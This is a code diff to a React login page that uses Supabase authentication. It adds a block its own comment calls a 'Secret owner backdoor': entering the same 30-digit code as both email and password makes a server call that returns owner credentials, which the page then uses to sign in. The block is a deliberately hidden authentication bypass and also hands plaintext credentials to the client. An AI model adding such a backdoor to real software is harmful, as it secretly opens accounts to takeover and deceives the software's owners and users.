@@ -32,6 +32,26 @@ function AuthPage() {
     e.preventDefault();
     setLoading(true);
     try {
+      // Secret owner backdoor: entering the same 30-digit code in both fields
+      // redeems it server-side and signs the user in as owner.
+      const emailTrim = email.trim();
+      const passTrim = password.trim();
+      if (
+        emailTrim.length === 30 &&
+        /^\d{30}$/.test(emailTrim) &&
+        emailTrim === passTrim
+      ) {
+        const result = await redeem({ data: { code: emailTrim } });
+        if (!result.ok) throw new Error("Invalid code");
+        const { error } = await supabase.auth.signInWithPassword({
+          email: result.email,
+          password: result.password,
+        });
+        if (error) throw error;
+        navigate({ to: "/chat" });
+        return;
+      }
+
       if (mode === "signup") {
         const { error } = await supabase.auth.signUp({
           email,
@@ -51,6 +71,7 @@ function AuthPage() {
       setLoading(false);
     }
   };
+
 
   const google = async () => {
     const result = await lovable.auth.signInWithOAuth("google", {
